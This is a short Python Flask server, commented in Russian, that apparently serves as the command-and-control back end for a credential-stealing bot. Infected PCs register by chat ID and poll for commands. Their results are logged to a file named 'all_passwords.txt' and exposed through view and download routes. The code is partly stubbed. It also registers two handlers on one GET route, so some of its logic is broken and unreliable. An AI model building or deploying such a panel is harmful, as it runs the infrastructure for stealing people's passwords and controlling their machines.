from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import json
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Хранилище
clients = {}  # chat_id -> pc_name
results = {}  # chat_id -> последний результат
all_results = []  # список всех результатов

RESULT_FILE = "all_passwords.txt"

@app.route('/register/<chat_id>', methods=['POST'])
def register(chat_id):
    data = request.get_json()
    pc_name = data.get('pc_name', 'Unknown')
    clients[chat_id] = pc_name
    return jsonify({"status": "ok"})

@app.route('/clients')
def get_clients():
    return jsonify(clients)

@app.route('/cmd/<chat_id>', methods=['POST'])
def send_cmd(chat_id):
    cmd = request.data.decode()
    # В реальном боте команды хранятся в очереди
    # Здесь упрощённо
    return jsonify({"status": "sent"})

@app.route('/poll/<chat_id>')
def poll(chat_id):
    # В реальности нужна очередь команд
    return "NO_CMD"

@app.route('/result/<chat_id>')
def get_result(chat_id):
    return results.get(chat_id, "NO_RESULT")

@app.route('/result/<chat_id>', methods=['GET'])
def add_result_route(chat_id):
    text = request.args.get('data', '')
    if text:
        results[chat_id] = text
        # Сохраняем в файл
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        pc_name = clients.get(chat_id, chat_id)
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {pc_name} ({chat_id}): {text}\n")
        all_results.append({"time": timestamp, "pc": pc_name, "result": text})
    return jsonify({"status": "ok"})

@app.route('/view-results')
def view_results():
    if not os.path.exists(RESULT_FILE):
        return "Нет результатов"
    with open(RESULT_FILE, "r", encoding="utf-8") as f:
        content = f.read()
    return f"<pre>{content}</pre>"

@app.route('/view-results/json')
def view_results_json():
    return jsonify(all_results)

@app.route('/download-results')
def download_results():
    if os.path.exists(RESULT_FILE):
        return send_file(RESULT_FILE, as_attachment=True)
    return "Нет файла"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
